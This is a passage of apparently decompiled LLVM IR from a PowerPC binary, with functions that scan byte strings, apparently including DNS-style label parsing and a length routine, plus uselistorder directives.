  %v0_10014378.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014368

dec_label_pc_10014364:                            ; preds = %dec_label_pc_100142f0, %dec_label_pc_1001434c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014368

dec_label_pc_10014368:                            ; preds = %dec_label_pc_10014354, %dec_label_pc_10014364
  %v0_10014378 = phi i32 [ %v0_10014378.pre, %dec_label_pc_10014354 ], [ -1, %dec_label_pc_10014364 ]
  store i32 %v0_100142b4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014378

; uselistorder directives
  uselistorder i32 %v0_1001434014, { 1, 0 }
  uselistorder i32 %v0_10014330.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1001431c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100142ec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @function_1000df60, { 5, 26, 25, 4, 1, 12, 11, 10, 24, 23, 22, 21, 19, 20, 18, 17, 16, 15, 14, 0, 13, 9, 7, 8, 3, 2, 6 }
  uselistorder i32 (i32, i32)* @function_1000de0c, { 2, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 46, { 1, 6, 4, 7, 0, 8, 5, 2, 3 }
  uselistorder label %dec_label_pc_10014368, { 1, 0 }
  uselistorder label %dec_label_pc_10014364, { 1, 0 }
  uselistorder label %dec_label_pc_1001434c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10014340, { 1, 0 }
  uselistorder label %dec_label_pc_100142f0, { 1, 0 }
}

define i32 @function_1001437c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1001437c:
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_10014380 = call i32 @__asm_mfcr()
  store i32 %v0_10014380, i32* @r26, align 4
  %v3_1001438c = icmp eq i32 %v0_10014380, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1001439c = load i32, i32* @r6, align 4
  store i32 %v0_1001439c, i32* @r24, align 4
  br i1 %v3_1001438c, label %dec_label_pc_10014454, label %dec_label_pc_100143a4

dec_label_pc_100143a4:                            ; preds = %dec_label_pc_1001437c
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1001443014 = load i32, i32* @r4, align 4
  %v2_1001443015 = add i32 %v1_1001443014, %v0_10014380
  %v3_1001443016 = inttoptr i32 %v2_1001443015 to i8*
  %v4_1001443017 = load i8, i8* %v3_1001443016, align 1
  %v5_1001443018 = zext i8 %v4_1001443017 to i32
  store i32 %v5_1001443018, i32* @r31, align 4
  store i1 false, i1* @cr4_eq, align 1
  %v3_1001443820 = icmp eq i8 %v4_1001443017, 0
  br i1 %v3_1001443820, label %dec_label_pc_10014444, label %dec_label_pc_100143b4

dec_label_pc_100143b4:                            ; preds = %dec_label_pc_100143a4, %dec_label_pc_1001442c
  %v3_1001443422 = phi i1 [ %v3_10014434, %dec_label_pc_1001442c ], [ false, %dec_label_pc_100143a4 ]
  %v5_1001443021 = phi i32 [ %v5_10014430, %dec_label_pc_1001442c ], [ %v5_1001443018, %dec_label_pc_100143a4 ]
  br i1 %v3_1001443422, label %dec_label_pc_100143bc, label %dec_label_pc_100143b8

dec_label_pc_100143b8:                            ; preds = %dec_label_pc_100143b4
  %v0_100143b8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100143b8 = add i32 %v0_100143b8, 1
  store i32 %v1_100143b8, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100143bc

dec_label_pc_100143bc:                            ; preds = %dec_label_pc_100143b4, %dec_label_pc_100143b8
  %v1_100143bc = call i32 @__asm_rlwinm(i32 %v5_1001443021, i32 0, i32 24, i32 25)
  %v0_100143c0 = load i32, i32* @r4, align 4
  %v1_100143c0 = add i32 %v0_100143c0, 1
  store i32 %v1_100143c0, i32* @r30, align 4
  %v3_100143c4 = icmp eq i32 %v1_100143bc, 192
  br i1 %v3_100143c4, label %dec_label_pc_100143cc, label %dec_label_pc_100143ec

dec_label_pc_100143cc:                            ; preds = %dec_label_pc_100143bc
  %v0_100143cc = load i1, i1* @cr4_eq, align 1
  br i1 %v0_100143cc, label %dec_label_pc_100143d4, label %dec_label_pc_100143d0

dec_label_pc_100143d0:                            ; preds = %dec_label_pc_100143cc
  %v0_100143d0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100143d0 = add i32 %v0_100143d0, 1
  store i32 %v1_100143d0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100143d4

dec_label_pc_100143d4:                            ; preds = %dec_label_pc_100143cc, %dec_label_pc_100143d0
  %v0_100143d4 = load i32, i32* @r26, align 4
  %v2_100143d4 = add i32 %v0_100143d4, %v1_100143c0
  %v3_100143d4 = inttoptr i32 %v2_100143d4 to i8*
  %v4_100143d4 = load i8, i8* %v3_100143d4, align 1
  %v5_100143d4 = zext i8 %v4_100143d4 to i32
  %v1_100143d8 = call i32 @__asm_rlwinm(i32 %v5_1001443021, i32 8, i32 18, i32 23)
  %v0_100143dc = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100143dc, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_100143e4 = or i32 %v5_100143d4, %v1_100143d8
  store i32 %v2_100143e4, i32* @r4, align 4
  br label %dec_label_pc_1001442c

dec_label_pc_100143ec:                            ; preds = %dec_label_pc_100143bc
  %v0_100143ec = load i32, i32* %r11.global-to-local, align 4
  %v2_100143ec = add i32 %v0_100143ec, %v5_1001443021
  store i32 %v2_100143ec, i32* @r29, align 4
  %v1_100143f0 = add i32 %v2_100143ec, 1
  store i32 %v1_100143f0, i32* @r28, align 4
  %v1_100143f4 = load i32, i32* @r24, align 4
  %v2_100143f4 = icmp ult i32 %v1_100143f0, %v1_100143f4
  br i1 %v2_100143f4, label %dec_label_pc_100143fc, label %dec_label_pc_10014454

dec_label_pc_100143fc:                            ; preds = %dec_label_pc_100143ec
  %v0_100143fc = load i32, i32* @r26, align 4
  %v2_100143fc = add i32 %v0_100143fc, %v1_100143c0
  store i32 %v2_100143fc, i32* @r4, align 4
  %v0_10014400 = load i32, i32* @r25, align 4
  %v2_10014400 = add i32 %v0_10014400, %v0_100143ec
  store i32 %v2_10014400, i32* @r3, align 4
  store i32 %v5_1001443021, i32* @r5, align 4
  store i32 268518412, i32* @lr, align 4
  %v0_10014408 = call i32 @function_1000dcb0()
  %v0_1001440c = load i32, i32* @r30, align 4
  %v2_1001440c = add i32 %v0_1001440c, %v5_1001443021
  store i32 %v2_1001440c, i32* @r4, align 4
  %v0_10014410 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10014410, label %dec_label_pc_10014418, label %dec_label_pc_10014414

dec_label_pc_10014414:                            ; preds = %dec_label_pc_100143fc
  %v0_10014414 = load i32, i32* %r27.global-to-local, align 4
  %v2_10014414 = add i32 %v0_10014414, %v5_1001443021
  store i32 %v2_10014414, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014418

dec_label_pc_10014418:                            ; preds = %dec_label_pc_100143fc, %dec_label_pc_10014414
  %v0_10014418 = load i32, i32* @r26, align 4
  %v2_10014418 = add i32 %v0_10014418, %v2_1001440c
  %v3_10014418 = inttoptr i32 %v2_10014418 to i8*
  %v4_10014418 = load i8, i8* %v3_10014418, align 1
  %v3_1001441c = icmp eq i8 %v4_10014418, 0
  br i1 %v3_1001441c, label %dec_label_pc_10014428, label %dec_label_pc_10014424

dec_label_pc_10014424:                            ; preds = %dec_label_pc_10014418
  br label %dec_label_pc_10014428

dec_label_pc_10014428:                            ; preds = %dec_label_pc_10014418, %dec_label_pc_10014424
  %v0_10014428.off0 = phi i8 [ 0, %dec_label_pc_10014418 ], [ 46, %dec_label_pc_10014424 ]
  %v1_10014428 = load i32, i32* @r25, align 4
  %v2_10014428 = load i32, i32* @r29, align 4
  %v4_10014428 = add i32 %v2_10014428, %v1_10014428
  %v5_10014428 = inttoptr i32 %v4_10014428 to i8*
  store i8 %v0_10014428.off0, i8* %v5_10014428, align 1
  %v0_1001442c.pre = load i32, i32* @r28, align 4
  %v0_10014434.pre.pre = load i32, i32* @r23, align 4
  %v1_10014430.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001442c

dec_label_pc_1001442c:                            ; preds = %dec_label_pc_100143d4, %dec_label_pc_10014428
  %v1_10014430 = phi i32 [ %v2_100143e4, %dec_label_pc_100143d4 ], [ %v1_10014430.pre, %dec_label_pc_10014428 ]
  %v0_10014434.pre = phi i32 [ 0, %dec_label_pc_100143d4 ], [ %v0_10014434.pre.pre, %dec_label_pc_10014428 ]
  %v0_1001442c = phi i32 [ %v0_100143dc, %dec_label_pc_100143d4 ], [ %v0_1001442c.pre, %dec_label_pc_10014428 ]
  %v0_10014430.pre = load i32, i32* @r26, align 4
  store i32 %v0_1001442c, i32* %r11.global-to-local, align 4
  %v2_10014430 = add i32 %v1_10014430, %v0_10014430.pre
  %v3_10014430 = inttoptr i32 %v2_10014430 to i8*
  %v4_10014430 = load i8, i8* %v3_10014430, align 1
  %v5_10014430 = zext i8 %v4_10014430 to i32
  store i32 %v5_10014430, i32* @r31, align 4
  %v3_10014434 = icmp eq i32 %v0_10014434.pre, 0
  store i1 %v3_10014434, i1* @cr4_eq, align 1
  %v3_10014438 = icmp eq i8 %v4_10014430, 0
  br i1 %v3_10014438, label %dec_label_pc_10014440, label %dec_label_pc_100143b4

dec_label_pc_10014440:                            ; preds = %dec_label_pc_1001442c
  %v0_10014448.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10014434, label %dec_label_pc_10014454, label %dec_label_pc_10014444

dec_label_pc_10014444:                            ; preds = %dec_label_pc_100143a4, %dec_label_pc_10014440
  %v0_10014448.pre26 = phi i32 [ %v0_10014448.pre.pre, %dec_label_pc_10014440 ], [ 0, %dec_label_pc_100143a4 ]
  %v1_10014444 = add i32 %v0_10014448.pre26, 1
  store i32 %v1_10014444, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014454

dec_label_pc_10014454:                            ; preds = %dec_label_pc_100143ec, %dec_label_pc_10014440, %dec_label_pc_10014444, %dec_label_pc_1001437c
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1001437c ], [ %v1_10014444, %dec_label_pc_10014444 ], [ %v0_10014448.pre.pre, %dec_label_pc_10014440 ], [ -1, %dec_label_pc_100143ec ]
  %v1_10014468 = call %1 @__asm_mtcrf(i32 8, i32 %v0_10014380)
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10014448.pre.pre, { 1, 0 }
  uselistorder i1 %v3_10014434, { 0, 2, 1 }
  uselistorder i32 %v5_10014430, { 1, 0 }
  uselistorder i32 %v5_1001443021, { 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_10014380, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_1000dcb0, { 12, 11, 10, 9, 8, 4, 3, 7, 6, 2, 19, 17, 16, 0, 5, 1, 15, 14, 13, 18 }
  uselistorder i32* @r5, { 39, 40, 41, 4, 42, 43, 44, 45, 46, 14, 47, 55, 56, 48, 49, 9, 5, 50, 1, 51, 35, 37, 15, 16, 36, 17, 18, 19, 57, 38, 20, 21, 22, 23, 24, 25, 70, 3, 52, 53, 62, 63, 64, 10, 26, 27, 28, 71, 72, 73, 74, 65, 66, 2, 67, 68, 69, 29, 30, 31, 0, 32, 33, 34, 58, 59, 11, 12, 13, 7, 60, 61, 6, 8, 54 }
  uselistorder i32* @r28, { 2, 67, 68, 69, 70, 71, 72, 77, 78, 73, 74, 75, 76, 79, 80, 81, 82, 83, 84, 85, 86, 87, 14, 3, 13, 15, 16, 17, 18, 19, 20, 88, 92, 89, 90, 91, 1, 93, 94, 95, 4, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 5, 108, 6, 109, 110, 111, 112, 113, 114, 115, 32, 33, 116, 117, 118, 119, 127, 128, 34, 66, 35, 7, 36, 37, 38, 39, 40, 8, 129, 130, 131, 132, 139, 9, 24, 25, 26, 12, 27, 122, 123, 124, 120, 121, 125, 126, 133, 134, 135, 136, 137, 41, 42, 43, 44, 45, 10, 46, 47, 11, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 64, 65, 21, 22, 23, 138, 30, 31, 28, 29 }
  uselistorder i32 23, { 10, 11, 12, 13, 6, 7, 8, 0, 1, 3, 2, 4, 5, 9 }
  uselistorder i32 18, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @r30, { 76, 77, 78, 8, 79, 81, 83, 84, 85, 86, 87, 80, 82, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 102, 99, 100, 5, 101, 4, 105, 103, 104, 106, 107, 109, 108, 6, 110, 32, 33, 34, 9, 35, 36, 37, 111, 112, 113, 114, 115, 116, 117, 118, 17, 119, 120, 121, 122, 123, 124, 125, 126, 38, 39, 72, 40, 41, 42, 43, 44, 73, 74, 10, 45, 46, 47, 48, 49, 11, 144, 145, 146, 147, 12, 130, 148, 159, 149, 150, 27, 0, 29, 13, 30, 31, 131, 132, 133, 127, 128, 129, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 75, 151, 152, 153, 154, 155, 156, 157, 14, 158, 50, 51, 52, 53, 54, 55, 56, 2, 58, 18, 59, 15, 60, 61, 57, 62, 63, 64, 65, 66, 67, 68, 16, 69, 70, 3, 71, 28 }
  uselistorder i1* @cr4_eq, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i1 false, { 2, 3, 5, 6, 14, 7, 8, 10, 11, 0, 12, 18, 19, 20, 15, 16, 17, 4, 13, 1, 9, 21, 22 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 14, 15, 16, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 2, 0 }
  uselistorder i32* @r25, { 11, 12, 13, 15, 16, 14, 17, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 34, 3, 4, 27, 28, 29, 30, 0, 7, 8, 9, 10, 32, 33, 5, 6 }
  uselistorder i32* @r26, { 1, 30, 31, 32, 33, 34, 35, 36, 39, 37, 38, 40, 41, 42, 43, 44, 3, 4, 45, 46, 47, 48, 49, 50, 51, 2, 52, 53, 54, 55, 56, 57, 58, 59, 60, 12, 13, 77, 5, 6, 7, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 0, 75, 76, 10, 11, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 20, 31, 19, 18, 17, 12, 28, 26, 35, 9, 8, 7, 6, 15, 34, 30, 29, 10, 33, 11, 39, 22, 21, 38, 25, 4, 14, 24, 13, 1, 32, 23, 16, 37, 36, 5, 3, 2, 0, 27 }
  uselistorder label %dec_label_pc_10014454, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10014444, { 1, 0 }
  uselistorder label %dec_label_pc_1001442c, { 1, 0 }
  uselistorder label %dec_label_pc_10014428, { 1, 0 }
  uselistorder label %dec_label_pc_10014418, { 1, 0 }
  uselistorder label %dec_label_pc_100143d4, { 1, 0 }
  uselistorder label %dec_label_pc_100143bc, { 1, 0 }
  uselistorder label %dec_label_pc_100143b4, { 1, 0 }
}

define i32 @function_10014470() local_unnamed_addr {
dec_label_pc_10014470:
  %r11.global-to-local = alloca i32, align 4
  %v0_10014470 = load i32, i32* @r3, align 4
  store i32 %v0_10014470, i32* %r11.global-to-local, align 4
  %v3_10014470 = icmp eq i32 %v0_10014470, 0
  %v0_10014478 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10014470, i32 %v0_10014478)
  %v0_10014488 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014494

dec_label_pc_10014480:                            ; preds = %dec_label_pc_10014490
  %v1_10014480 = add i32 %v1_10014494, 2
  br label %dec_label_pc_100144b0

dec_label_pc_10014490:                            ; preds = %dec_label_pc_10014494
  %v2_100144a8 = add i32 %v1_10014498, %v5_10014494
  %v3_100144a4 = icmp eq i32 %v1_100144a0, 192
  br i1 %v3_100144a4, label %dec_label_pc_10014480, label %dec_label_pc_10014494

dec_label_pc_10014494:                            ; preds = %dec_label_pc_10014490, %dec_label_pc_10014470
  %v1_10014494 = phi i32 [ %v2_100144a8, %dec_label_pc_10014490 ], [ %v0_10014488, %dec_label_pc_10014470 ]
  %v0_10014494 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014494 = add i32 %v0_10014494, %v1_10014494
  %v3_10014494 = inttoptr i32 %v2_10014494 to i8*
  %v4_10014494 = load i8, i8* %v3_10014494, align 1
  %v5_10014494 = zext i8 %v4_10014494 to i32
  %v1_10014498 = add i32 %v1_10014494, 1
  %v3_1001449c = icmp eq i8 %v4_10014494, 0
  %v1_100144a0 = call i32 @__asm_rlwinm(i32 %v5_10014494, i32 0, i32 24, i32 25)
  br i1 %v3_1001449c, label %dec_label_pc_100144b0, label %dec_label_pc_10014490

dec_label_pc_100144b0:                            ; preds = %dec_label_pc_10014494, %dec_label_pc_10014480
  %v1_100144b0 = phi i32 [ %v1_10014480, %dec_label_pc_10014480 ], [ %v1_10014498, %dec_label_pc_10014494 ]
  %v0_100144b0 = load i32, i32* @r4, align 4
  %v2_100144b0 = sub i32 %v1_100144b0, %v0_100144b0
  ret i32 %v2_100144b0

; uselistorder directives
  uselistorder i32 %v1_10014498, { 1, 0 }
  uselistorder i32 %v5_10014494, { 1, 0 }
  uselistorder i32 %v1_10014494, { 2, 1, 0 }
  uselistorder i32 %v0_10014470, { 1, 0 }
  uselistorder i32 25, { 3, 4, 5, 6, 7, 2, 1, 0 }
  uselistorder i8 0, { 37, 34, 4, 38, 2, 39, 40, 5, 23, 44, 42, 22, 43, 41, 21, 45, 46, 47, 48, 50, 49, 24, 6, 51, 52, 7, 8, 53, 54, 55, 56, 26, 59, 57, 58, 25, 60, 61, 9, 63, 62, 27, 64, 35, 0, 65, 66, 67, 68, 10, 69, 70, 11, 1, 12, 71, 72, 73, 75, 76, 77, 78, 74, 79, 13, 80, 81, 82, 83, 85, 86, 87, 88, 84, 89, 3, 14, 15, 16, 17, 18, 19, 90, 91, 93, 92, 20, 94, 95, 96, 97, 98, 100, 28, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 114, 115, 116, 118, 117, 120, 119, 121, 29, 123, 122, 36, 124, 30, 125, 127, 128, 126, 31, 129, 130, 33, 131, 32, 132, 133, 134, 135, 136 }
  uselistorder i32 192, { 3, 4, 2, 1, 0 }
  uselistorder i32 2, { 0, 4, 5, 120, 121, 6, 122, 49, 123, 124, 30, 1, 2, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 7, 137, 8, 89, 90, 91, 31, 29, 138, 139, 140, 141, 142, 50, 51, 32, 143, 144, 145, 102, 103, 150, 43, 9, 10, 3, 52, 146, 11, 12, 33, 41, 104, 105, 13, 106, 116, 117, 53, 54, 55, 94, 56, 95, 57, 96, 151, 34, 14, 15, 58, 59, 60, 61, 62, 16, 47, 48, 63, 64, 149, 46, 153, 17, 18, 35, 36, 37, 38, 39, 65, 66, 147, 148, 40, 107, 108, 109, 19, 20, 21, 22, 23, 110, 111, 24, 113, 114, 115, 28, 112, 67, 25, 26, 152, 154, 68, 92, 70, 71, 69, 72, 93, 74, 73, 44, 75, 76, 77, 78, 79, 97, 98, 99, 100, 101, 80, 42, 119, 81, 82, 83, 84, 85, 118, 45, 27, 86, 87, 88 }
  uselistorder i32* @r4, { 82, 83, 1, 84, 85, 86, 87, 2, 88, 89, 3, 90, 91, 10, 11, 92, 93, 94, 95, 96, 97, 98, 99, 56, 122, 119, 120, 100, 101, 102, 103, 104, 5, 106, 107, 108, 109, 110, 34, 12, 76, 79, 80, 57, 77, 78, 58, 59, 60, 61, 62, 63, 132, 7, 6, 46, 47, 124, 13, 54, 55, 121, 48, 9, 111, 112, 118, 105, 81, 125, 126, 127, 64, 65, 66, 8, 67, 68, 113, 114, 115, 116, 117, 4, 49, 50, 131, 69, 70, 71, 72, 0, 73, 74, 75, 123, 43, 44, 45, 128, 129, 130, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 51, 52, 53 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 16, 17, 19, 20, 21, 22, 23, 24, 0, 25, 30, 26, 1, 2, 3, 4, 5, 6, 27, 15, 9, 10, 11, 12, 7, 28, 29, 18, 32, 31, 8, 13, 14 }
}

define i32 @function_100144b8(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100144b8:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100144c4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100144d0 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100144d8 = and i16 %v3_100144d0, 4
  %v3_100144d8 = icmp eq i16 %v1_100144d8, 0
  br i1 %v3_100144d8, label %dec_label_pc_100144e0, label %dec_label_pc_10014518

dec_label_pc_100144e0:                            ; preds = %dec_label_pc_100144b8
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_100144ec, label %dec_label_pc_100144e4

dec_label_pc_100144e4:                            ; preds = %dec_label_pc_100144e0
  br label %dec_label_pc_100144ec

dec_label_pc_100144ec:                            ; preds = %dec_label_pc_100144e0, %dec_label_pc_100144e4
  %v1_100144ec = add i32 %tmp, 4
  %v2_100144ec = inttoptr i32 %v1_100144ec to i32*
  %v3_100144ec = load i32, i32* %v2_100144ec, align 4
  store i32 %v3_100144ec, i32* %r3.global-to-local, align 4
  store i32 268518644, i32* @lr, align 4
  %v1_100144f0 = call i32 @function_1000c63c(i32 %v3_100144ec)
  store i32 %v1_100144f0, i32* %r3.global-to-local, align 4
  %v2_100144f4 = icmp sgt i32 %v1_100144f0, 0
  br i1 %v2_100144f4, label %dec_label_pc_10014518, label %dec_label_pc_100144fc

dec_label_pc_100144fc:                            ; preds = %dec_label_pc_100144ec
  %v3_100144f4 = icmp eq i32 %v1_100144f0, 0
  %v0_100144fc = load i32, i32* @r31, align 4
  %v1_100144fc = inttoptr i32 %v0_100144fc to i16*
  %v2_100144fc = load i16, i16* %v1_100144fc, align 2
  br i1 %v3_100144f4, label %dec_label_pc_10014504, label %dec_label_pc_1001450c

dec_label_pc_10014504:                            ; preds = %dec_label_pc_100144fc
  %v1_10014504 = or i16 %v2_100144fc, 4
  br label %dec_label_pc_10014514

dec_label_pc_1001450c:                            ; preds = %dec_label_pc_100144fc
  %v1_1001450c = or i16 %v2_100144fc, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014514

dec_label_pc_10014514:                            ; preds = %dec_label_pc_10014504, %dec_label_pc_1001450c
  %v1_10014504.sink.off0 = phi i16 [ %v1_10014504, %dec_label_pc_10014504 ], [ %v1_1001450c, %dec_label_pc_1001450c ]
  store i16 %v1_10014504.sink.off0, i16* %v1_100144fc, align 2
  %v0_10014528.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014518

dec_label_pc_10014518:                            ; preds = %dec_label_pc_100144b8, %dec_label_pc_100144ec, %dec_label_pc_10014514
  %v0_10014528 = phi i32 [ 0, %dec_label_pc_100144b8 ], [ %v1_100144f0, %dec_label_pc_100144ec ], [ %v0_10014528.pre, %dec_label_pc_10014514 ]
  store i32 %v0_100144c4, i32* @r31, align 4
  ret i32 %v0_10014528

; uselistorder directives
  uselistorder i16 %v2_100144fc, { 1, 0 }
  uselistorder i32 %v1_100144f0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32 (i32)* @function_1000c63c, { 0, 2, 1 }
  uselistorder i32 4, {}
  uselistorder i16 0, { 0, 13, 1, 2, 11, 3, 4, 5, 6, 7, 12, 8, 9, 10, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_10014518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014514, { 1, 0 }
  uselistorder label %dec_label_pc_100144ec, { 1, 0 }
}

define i32 @function_1001452c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1001452c:
  %r0.global-to-local = alloca i32, align 4
  %v0_10014530 = load i32, i32* @lr, align 4
  store i32 %v0_10014530, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10014540 = add i32 %arg1, 8
  %v2_10014540 = inttoptr i32 %v1_10014540 to i32*
  %v3_10014540 = load i32, i32* %v2_10014540, align 4
  %v1_10014544 = add i32 %arg1, 12
  %v2_10014544 = inttoptr i32 %v1_10014544 to i32*
  %v3_10014544 = load i32, i32* %v2_10014544, align 4
  %v2_10014548 = sub i32 %v3_10014544, %v3_10014540
  store i32 268518736, i32* @lr, align 4
  %v3_1001454c = inttoptr i32 %v3_10014540 to i16*
  %v4_1001454c = call i32 @function_100144b8(i16* %v3_1001454c, i32 %v2_10014548, i32 %v2_10014548)
  %v0_10014550 = load i32, i32* @r29, align 4
  %v1_10014550 = add i32 %v0_10014550, 8
  %v2_10014550 = inttoptr i32 %v1_10014550 to i32*
  %v3_10014550 = load i32, i32* %v2_10014550, align 4
  %v2_10014554 = add i32 %v3_10014550, %v4_1001454c
  store i32 %v2_10014554, i32* %r0.global-to-local, align 4
  %v2_10014558 = add i32 %v0_10014550, 16
  %v3_10014558 = inttoptr i32 %v2_10014558 to i32*
  store i32 %v3_10014550, i32* %v3_10014558, align 4
  %v0_1001455c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001455c = load i32, i32* @r29, align 4
  %v2_1001455c = add i32 %v1_1001455c, 20
  %v3_1001455c = inttoptr i32 %v2_1001455c to i32*
  store i32 %v0_1001455c, i32* %v3_1001455c, align 4
  store i32 %v0_10014530, i32* %r0.global-to-local, align 4
  ret i32 %v4_1001454c

; uselistorder directives
  uselistorder i32 %v3_10014550, { 1, 0 }
  uselistorder i32 %v4_1001454c, { 1, 0 }
  uselistorder i32 %v3_10014540, { 1, 0 }
  uselistorder i32 20, { 30, 31, 32, 33, 34, 35, 36, 1, 17, 18, 19, 28, 29, 4, 5, 13, 6, 0, 38, 39, 20, 21, 22, 23, 24, 26, 27, 25, 37, 7, 8, 9, 10, 11, 12, 14, 2, 3, 15, 16 }
  uselistorder i32 12, { 46, 47, 48, 49, 50, 0, 51, 52, 53, 12, 15, 54, 55, 56, 7, 8, 9, 13, 33, 34, 35, 36, 37, 38, 39, 40, 5, 6, 41, 45, 42, 67, 16, 24, 31, 17, 58, 59, 60, 61, 4, 57, 1, 2, 3, 14, 62, 63, 64, 65, 68, 43, 44, 18, 19, 20, 21, 22, 11, 10, 23, 25, 26, 27, 28, 29, 30, 32, 66 }
  uselistorder i32* @r29, { 69, 70, 71, 72, 73, 74, 75, 76, 135, 136, 1, 77, 14, 78, 79, 80, 81, 83, 82, 84, 85, 86, 87, 88, 18, 19, 20, 21, 22, 2, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 15, 101, 102, 103, 104, 105, 106, 16, 3, 0, 107, 108, 109, 110, 111, 112, 4, 113, 35, 114, 115, 116, 117, 118, 119, 137, 138, 65, 66, 37, 38, 39, 36, 67, 17, 40, 41, 5, 42, 43, 44, 45, 46, 47, 139, 140, 141, 142, 143, 144, 145, 6, 26, 34, 125, 126, 127, 128, 129, 7, 130, 131, 120, 121, 122, 123, 124, 132, 133, 134, 8, 68, 9, 146, 147, 148, 48, 49, 10, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 11, 13, 12, 64, 23, 61, 62, 149, 150, 151, 152, 24, 25, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_10014574(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10014574:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1001457c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10014588 = load i16, i16* %arg1, align 2
  %v4_10014588 = zext i16 %v3_10014588 to i32
  %v2_1001458c = and i32 %v4_10014588, %arg2
  %v5_1001458c = icmp eq i32 %v2_1001458c, 0
  br i1 %v5_1001458c, label %dec_label_pc_10014594, label %dec_label_pc_100145a4

dec_label_pc_10014594:                            ; preds = %dec_label_pc_10014574
  %v1_10014594 = and i32 %v4_10014588, 2176
